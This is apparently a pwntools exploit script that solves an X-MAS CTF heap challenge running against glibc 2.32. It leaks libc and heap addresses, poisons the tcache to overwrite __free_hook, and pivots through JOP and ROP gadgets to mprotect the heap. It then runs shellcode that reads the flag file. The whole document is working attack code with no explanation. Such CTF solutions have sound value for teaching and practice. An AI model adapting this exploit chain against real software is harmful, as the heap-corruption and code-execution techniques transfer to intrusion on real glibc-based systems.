#!/usr/bin/python3

from pwn import *

libc = ELF("./libc.so.6")
context.arch = "amd64"

r = True
if r:
    p = remote("challs.xmas.htsp.ro", 2005)
else:
    p = process("./chall")
    gdb.attach(p, """
        b *$rebase(0x323C)
    """)

def alloc(idx, data, label):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", f"{idx}")
    p.sendlineafter(":", f"{len(data)}")
    p.recvuntil(":")
    p.send(data)
    p.recvuntil(":")
    p.send(label)

def delete(idx):
    p.sendlineafter(">", "3")
    p.sendlineafter(":", f"{idx}")

def edit(idx, data):
    p.sendlineafter(">", "4")
    p.sendlineafter(":", f"{idx}")
    p.recvuntil("Data: ")
    p.send(data)

def print_chunk(idx):
    p.sendlineafter(">", "2")
    p.sendlineafter(":", f"{idx}")
    p.recvuntil("leak: ")
    leak = int(p.recvline()[:-1], 16)
    p.recvuntil("Data: ")
    data = p.recvuntil("Label")[:-6]
    return (leak, data)

# LOL glibc 2.32
def obfuscate(p, adr):
    return p^(adr>>12)

alloc(11, b"D"*(0x30 - 8), b"B\n")
alloc(12, b"A"*(0x30 - 8), b"B\n")

delete(12)
delete(11)
alloc(15, b"Q"*(0x90 - 8), b"B\n")

n_tcache_90h = 4
for i in range(n_tcache_90h):
    alloc(i, b"A"*(0x90 - 8), b"B\n")

for i in range(n_tcache_90h):
    delete(i)

n = 0x20
alloc(4, b"4"*(n - 8), b"B\n")
alloc(3, b"3"*(n - 8), b"C"*0x10 + p8(0x90))
edit(4, b'\x00' * (n-8) + p64(0x91))
alloc(2, b"2"*(n - 8), b"C"*0x10 + p8(0x90))
alloc(1, b"1"*(n - 8), b"C"*0x10 + p8(0x90))

asdf = b''
asdf += b'\x00' * (n-8) + p64(0x91)
asdf += b'\x00' * (n-8) + p64(0x91)
edit(3, asdf)

delete(2)
alloc(0, b"1"*(n - 8), b"C"*0x10 + p8(0x90))
delete(1)
delete(3)
delete(0)

# now get libc & pwn
n = 0x30
delete(15) # libc ptr here
alloc(12, b"A"*(n - 8), b"B\n")
alloc(11, b"B"*(n - 8), b"C"*0x10 + p8(0xf0))
edit(12, b'\x00' * (n-8) + p64(0xf1))
alloc(10, b"C"*(n - 8), b"C"*0x10 + p8(0xf0))

leak, data = print_chunk(11)
print(hexdump(data))

libc_leak = u64(data[0x60:0x68])
libc.address = libc_leak - 0x1e3c00
log.info(f"libc_leak: 0x{libc_leak:02x}")
log.info(f"libc base: 0x{libc.address:02x}")

heap_leak_1 = u64(data[0xc0:0xc8])
heap_leak_2 = u64(data[0xc8:0xd0])
heap_base = heap_leak_2 - 0x10

log.info(f"heap1: 0x{heap_leak_1:02x}")
log.info(f"heap2: 0x{heap_leak_2:02x}")
log.info(f"heap base: 0x{heap_base:02x}")

alloc(9, b"C"*(n - 8), b"C\n")
delete(9)
delete(10)


target = obfuscate(libc.symbols['__free_hook'], heap_leak_2)

fake_chunkie = b''
fake_chunkie += b'\x00'*(n-8)
fake_chunkie += p64(n)
fake_chunkie += p64(target)
fake_chunkie += p64(0x4242)
edit(11, fake_chunkie)

"""
0x0000000000143d6a: mov rax, qword ptr [rdi + 8]; call qword ptr [rax + 8]; 
0x0000000000143d66: mov qword ptr [rsp], rax; mov rax, qword ptr [rdi + 8]; call qword ptr [rax + 8]; 
0x0000000000141331: push rdi; pop rsp; lea rsi, [rdi + 0x48]; mov rdi, r8; mov rax, qword ptr [rax + 0x18]; jmp rax;
0x00000000001470f5: mov rdi, qword ptr [rax]; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 8]; 
"""


ret = libc.address + 0x0000000000026699
pop_rdi_ret = libc.address + 0x000000000002858f
pop_rsi_ret = libc.address + 0x000000000002ac3f
pop_rsp_ret = libc.address + 0x000000000003418a
pop_rdx_rbx_ret = libc.address + 0x00000000001597d6

rop_start = heap_base + 0x910
lol_jop_start = heap_base + 0x890

lol_jop = b''
lol_jop += p64(0) * 2
# START HERE
lol_jop += p64(lol_jop_start + 8*4) # rax + 0
lol_jop += p64(libc.address + 0x00000000001470f5) # rax + 8: PC
lol_jop += p64(0x414143) # rax + 0x10:
lol_jop += p64(libc.address + 0x0000000000141331) # rax + 0x18

lol_jop += p64(ret) # <- rdi
lol_jop += p64(ret) # <- pc
lol_jop += p64(pop_rsp_ret)
lol_jop += p64(rop_start)
lol_jop += p64(ret)
lol_jop += p64(ret)
lol_jop += p64(pop_rdi_ret)
lol_jop += p64(lol_jop_start + 8 * 2) # <- rax


print(hex(len(lol_jop)))

lol_jop = lol_jop.ljust((0x80 - 8), b"\x00")

alloc(15, lol_jop, b"T\n")

delete(15)

code_start = heap_base + 0x970

ropchain = b''
ropchain += p64(0)* 2
ropchain += p64(pop_rdi_ret)
ropchain += p64(heap_base)
ropchain += p64(pop_rsi_ret)
ropchain += p64(4096)
ropchain += p64(pop_rdx_rbx_ret)
ropchain += p64(0x7)
ropchain += p64(0x41414141) # garbage
ropchain += p64(libc.symbols['mprotect'])
ropchain += p64(code_start)

ropchain = ropchain.ljust((0x60 - 8), b"Q")

alloc(15, ropchain, b"T\n")

delete(15)

code = b''
code += b'\x90'*0x10
code += asm(pwnlib.shellcraft.amd64.linux.cat("/home/ctf/flag.txt", fd=1))
code = code.ljust((0x70-8), b'\xc3')

alloc(15, code, b"B\n")
delete(15)


rdi_loc = heap_base + 0x510
rdi_buf = b''
rdi_buf += p64(0x43434343)       # rdi + 0, 
rdi_buf += p64(lol_jop_start)    # rdi + 0x8
rdi_buf += p64(0x41414141)       # rdi + 0x10
rdi_buf += p64(0x44444444)       # rdi + 0x18

rdi_buf += p64(0x1)
#rdi_buf += p64(0x2)

rdi_buf = rdi_buf.ljust((n-8), b'\x41')
alloc(15, rdi_buf, b"B\n")

free_hook_stuff = b''
# RIP vvvv
# jump to rdi
free_hook_stuff += p64(libc.address + 0x0000000000143d6a) # mov rax, qword ptr [rdi + 8]; call qword ptr [rax + 8]; 

free_hook_stuff = free_hook_stuff.ljust((n-8), b'\x90')
alloc(14, free_hook_stuff, b"B\n")

delete(15)

p.interactive()